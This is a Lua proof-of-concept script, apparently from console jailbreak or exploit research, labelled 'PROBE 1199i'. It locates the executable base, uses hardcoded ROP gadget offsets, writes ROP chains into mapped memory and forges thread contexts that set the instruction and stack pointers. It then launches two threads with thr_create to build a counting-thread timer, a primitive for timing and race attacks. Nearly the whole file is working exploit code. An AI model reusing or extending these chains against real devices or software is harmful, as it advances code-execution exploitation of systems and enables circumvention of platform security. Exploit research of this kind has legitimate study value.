-- CRASH_CLASS: MODERATE
-- PROBE 1199i: Counting thread timing PoC
--
-- Verify two-thread timing works:
-- Thread A: writes 1, 2, 3, ... to shared counter via ROP
-- Thread B: reads counter 10 times with delays between reads
-- If reader sees monotonically increasing values, we have a timer.
-- Uses thr_create(430) for direct RSP control.

print("=== PROBE 1199i: Counting thread PoC ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print(string.format("eboot: 0x%X%08X", text_hi, text_lo))

-- Gadget addresses (relative to eboot)
local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local mov_rax_rax_ret = eboot + uint64(0x1EEBB)
local bare_ret        = eboot + uint64(0x42)

-- Syscall addresses
local sc_thr_create = make_syscall(430)
local sc_thr_exit   = make_syscall(431)
local sc_thr_kill   = make_syscall(433)
local sc_mmap       = make_syscall(477)

-- Allocate shared memory regions
local counter_page = sc_mmap(uint64(0), uint64(0x4000), uint64(0x3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local ch, cl = get_hi_lo(counter_page)
if ch >= 0xFFFF0000 then print("FATAL: counter mmap failed"); return end
local counter_addr = counter_page  -- 8 bytes for the counter
local results_addr = counter_page + uint64(0x100) -- 10 x 8 = 80 bytes
local done_a_addr  = counter_page + uint64(0x200) -- flag: thread A done
local done_b_addr  = counter_page + uint64(0x208) -- flag: thread B done

-- Zero everything
for i = 0, 0x300, 4 do safe_wd(counter_page + uint64(i), 0) end

print(string.format("counter: 0x%X%08X", get_hi_lo(counter_addr)))
print(string.format("results: 0x%X%08X", get_hi_lo(results_addr)))

-- ==========================================
-- Build counter thread chain (Thread A)
-- ==========================================
-- Chain: writes 1, 2, 3, ... N to counter, then sets done flag
-- Layout: pop rax → N, mov [rdi],rax;ret (rdi preset in ucontext)
-- Each tick: 3 qwords = 24 bytes
-- With 2MB, ~87K ticks

local chain_a_size = 2 * 1024 * 1024
local chain_a = sc_mmap(uint64(0), uint64(chain_a_size), uint64(0x3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local ca_h, ca_l = get_hi_lo(chain_a)
if ca_h >= 0xFFFF0000 then print("FATAL: chain_a mmap failed"); return end

-- Write counter chain: 50000 ticks (enough for timing)
local COUNTER_TICKS = 50000
local off = 0
for i = 1, COUNTER_TICKS do
    safe_wq(chain_a + uint64(off), uint64(i))           -- value
    off = off + 8
    safe_wq(chain_a + uint64(off), mov_rdi_rax_ret)     -- write to [rdi]
    off = off + 8
    safe_wq(chain_a + uint64(off), pop_rax_ret)          -- next pop
    off = off + 8
end

-- After counter loop: set done_a flag
-- pop rdi → done_a_addr, pop rax → 1, mov [rdi],rax;ret
safe_wq(chain_a + uint64(off), uint64(0xDEAD))  -- dummy for last pop rax
off = off + 8
safe_wq(chain_a + uint64(off), pop_rdi_ret)
off = off + 8
safe_wq(chain_a + uint64(off), done_a_addr)
off = off + 8
safe_wq(chain_a + uint64(off), pop_rax_ret)
off = off + 8
safe_wq(chain_a + uint64(off), uint64(0xCAFE))
off = off + 8
safe_wq(chain_a + uint64(off), mov_rdi_rax_ret)
off = off + 8

-- Exit: syscall 431 (thr_exit)
-- pop rax → 431, pop rdi → 0, then we need syscall gadget...
-- Actually we don't have a syscall;ret gadget in eboot.
-- Just end with bare_ret chain that eventually crashes — the thread dies
-- OR: just let it run off the end of the chain (will fault, thread dies)
safe_wq(chain_a + uint64(off), bare_ret)
off = off + 8

local chain_a_used = off
print(string.format("chain A: %d bytes (%d ticks)", chain_a_used, COUNTER_TICKS))

-- ==========================================
-- Build reader thread chain (Thread B)
-- ==========================================
-- Chain: small startup delay, then read counter 10 times with delays
-- Read: pop rax → counter_addr, mov rax,[rax];ret, pop rdi → result[i], mov [rdi],rax;ret
-- Delay: N × (pop rax → 0, bare_ret) = 16 bytes per NOP
-- Each read = 6 qwords = 48 bytes

local chain_b_size = 512 * 1024  -- 512KB is plenty
local chain_b = sc_mmap(uint64(0), uint64(chain_b_size), uint64(0x3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local cb_h, cb_l = get_hi_lo(chain_b)
if cb_h >= 0xFFFF0000 then print("FATAL: chain_b mmap failed"); return end

local boff = 0
local DELAY_NOPS = 500  -- 500 NOPs between reads = ~1500 cycles ≈ 430ns
local NUM_READS = 10

-- Small startup delay (let counter thread start first)
local STARTUP_DELAY = 2000
for i = 1, STARTUP_DELAY do
    safe_wq(chain_b + uint64(boff), uint64(0))  -- dummy value
    boff = boff + 8
    safe_wq(chain_b + uint64(boff), pop_rax_ret) -- next pop (acts as NOP chain)
    boff = boff + 8
end

-- Read counter 10 times with delays
for r = 0, NUM_READS - 1 do
    -- Read counter: pop rax → &counter, mov rax,[rax];ret → rax = counter value
    safe_wq(chain_b + uint64(boff), counter_addr)   -- for pop rax
    boff = boff + 8
    safe_wq(chain_b + uint64(boff), mov_rax_rax_ret) -- rax = *counter
    boff = boff + 8

    -- Store to results: pop rdi → &results[r], mov [rdi],rax;ret
    safe_wq(chain_b + uint64(boff), pop_rdi_ret)
    boff = boff + 8
    safe_wq(chain_b + uint64(boff), results_addr + uint64(r * 8))
    boff = boff + 8
    safe_wq(chain_b + uint64(boff), mov_rdi_rax_ret)
    boff = boff + 8

    -- Delay NOPs (except after last read)
    if r < NUM_READS - 1 then
        safe_wq(chain_b + uint64(boff), pop_rax_ret)  -- entry into NOP loop
        boff = boff + 8
        for n = 1, DELAY_NOPS do
            safe_wq(chain_b + uint64(boff), uint64(0))
            boff = boff + 8
            safe_wq(chain_b + uint64(boff), pop_rax_ret)
            boff = boff + 8
        end
    else
        safe_wq(chain_b + uint64(boff), pop_rax_ret)
        boff = boff + 8
    end
end

-- Set done_b flag
safe_wq(chain_b + uint64(boff), uint64(0xBEEF))
boff = boff + 8
safe_wq(chain_b + uint64(boff), pop_rdi_ret)
boff = boff + 8
safe_wq(chain_b + uint64(boff), done_b_addr)
boff = boff + 8
safe_wq(chain_b + uint64(boff), pop_rax_ret)
boff = boff + 8
safe_wq(chain_b + uint64(boff), uint64(0xBEEF))
boff = boff + 8
safe_wq(chain_b + uint64(boff), mov_rdi_rax_ret)
boff = boff + 8
safe_wq(chain_b + uint64(boff), bare_ret)
boff = boff + 8

local chain_b_used = boff
print(string.format("chain B: %d bytes (%d reads, %d delay NOPs)",
    chain_b_used, NUM_READS, DELAY_NOPS))

-- ==========================================
-- Build ucontext for Thread A (counter)
-- ==========================================
local uctx_a = memory.alloc(0x4C0)
-- Zero it
for i = 0, 0x4C0 - 4, 4 do safe_wd(uctx_a + i, 0) end

-- GP regs
safe_wq(uctx_a + 0x48, counter_addr)  -- RDI = counter address

-- RIP = pop_rax_ret (first gadget pops first chain value)
safe_wq(uctx_a + 0xE0, pop_rax_ret)

-- RSP = chain_a start (first value will be popped)
safe_wq(uctx_a + 0xF8, chain_a)

-- RFLAGS
safe_wq(uctx_a + 0xF0, uint64(0x202))

-- CS, SS
safe_wq(uctx_a + 0xC0, uint64(0x43))
safe_wq(uctx_a + 0x100, uint64(0x3B))

-- Gates
safe_wd(uctx_a + 0xD0, 7)
safe_wq(uctx_a + 0x108, uint64(0x480))
safe_wq(uctx_a + 0x110, uint64(0x10000))

print("ucontext A built")

-- ==========================================
-- Build ucontext for Thread B (reader)
-- ==========================================
local uctx_b = memory.alloc(0x4C0)
for i = 0, 0x4C0 - 4, 4 do safe_wd(uctx_b + i, 0) end

-- RIP = pop_rax_ret
safe_wq(uctx_b + 0xE0, pop_rax_ret)
-- RSP = chain_b start
safe_wq(uctx_b + 0xF8, chain_b)
-- RFLAGS
safe_wq(uctx_b + 0xF0, uint64(0x202))
-- CS, SS
safe_wq(uctx_b + 0xC0, uint64(0x43))
safe_wq(uctx_b + 0x100, uint64(0x3B))
-- Gates
safe_wd(uctx_b + 0xD0, 7)
safe_wq(uctx_b + 0x108, uint64(0x480))
safe_wq(uctx_b + 0x110, uint64(0x10000))

print("ucontext B built")

-- ==========================================
-- Launch both threads
-- ==========================================
local tid_a_buf = memory.alloc(8)
local tid_b_buf = memory.alloc(8)
safe_wq(tid_a_buf, uint64(0))
safe_wq(tid_b_buf, uint64(0))

print("")
print("--- Launching threads ---")

-- Launch counter thread first
local ret_a
pcall(function()
    ret_a = to_num(sc_thr_create(uint64(uctx_a), uint64(tid_a_buf), uint64(0)))
end)
local tid_a = safe_rd(tid_a_buf)
print(string.format("Thread A (counter): ret=%s tid=%s", tostring(ret_a), tostring(tid_a)))

-- Small delay then launch reader
-- (Reader has 2000-NOP startup delay built in)
local ret_b
pcall(function()
    ret_b = to_num(sc_thr_create(uint64(uctx_b), uint64(tid_b_buf), uint64(0)))
end)
local tid_b = safe_rd(tid_b_buf)
print(string.format("Thread B (reader):  ret=%s tid=%s", tostring(ret_b), tostring(tid_b)))

-- ==========================================
-- Wait and read results
-- ==========================================
-- Wait up to 2 seconds for completion
print("")
print("--- Waiting for threads ---")

local sc_usleep = make_syscall(250)  -- nanosleep isn't great, use usleep
-- Actually, use nanosleep(240) with a timespec
local sleep_ts = memory.alloc(16)
safe_wd(sleep_ts, 0)       -- seconds
safe_wd(sleep_ts + 4, 0)
safe_wd(sleep_ts + 8, 100000000)  -- 100ms in nanoseconds
safe_wd(sleep_ts + 12, 0)
local sc_nanosleep = make_syscall(240)

for wait = 1, 20 do  -- 20 x 100ms = 2 seconds max
    pcall(function() sc_nanosleep(uint64(sleep_ts), uint64(0)) end)
    local da = safe_rd(done_a_addr)
    local db = safe_rd(done_b_addr)
    if da and da ~= 0 and db and db ~= 0 then
        print(string.format("Both threads done after %dms", wait * 100))
        break
    end
    if wait == 20 then
        print(string.format("Timeout! done_a=%s done_b=%s", tostring(da), tostring(db)))
    end
end

-- Read counter final value
local counter_final_h, counter_final_l = get_hi_lo(safe_rq(counter_addr))
print(string.format("Counter final: 0x%X%08X (%d)",
    counter_final_h, counter_final_l, counter_final_l))

-- Read results
print("")
print("--- Reader results (10 counter snapshots) ---")
local prev = 0
local all_increasing = true
for r = 0, NUM_READS - 1 do
    local val = safe_rq(results_addr + uint64(r * 8))
    local vh, vl = get_hi_lo(val)
    local v = vl  -- counter values are small, fits in low 32
    if v <= prev and r > 0 then all_increasing = false end
    local delta = r > 0 and (v - prev) or 0
    print(string.format("  result[%d] = %d  (delta=%d)", r, v, delta))
    prev = v
end

print("")
if all_increasing then
    print("** MONOTONIC — counting thread timer WORKS **")
    print(string.format("  Resolution: each tick ≈ 3-5 cycles at reader"))
    print(string.format("  Delta per %d NOPs: %d-ish counter ticks", DELAY_NOPS,
        prev > 0 and math.floor(prev / NUM_READS) or 0))
else
    print("** NOT MONOTONIC — timing not usable **")
end

print("")
print("=== PROBE 1199i COMPLETE ===")
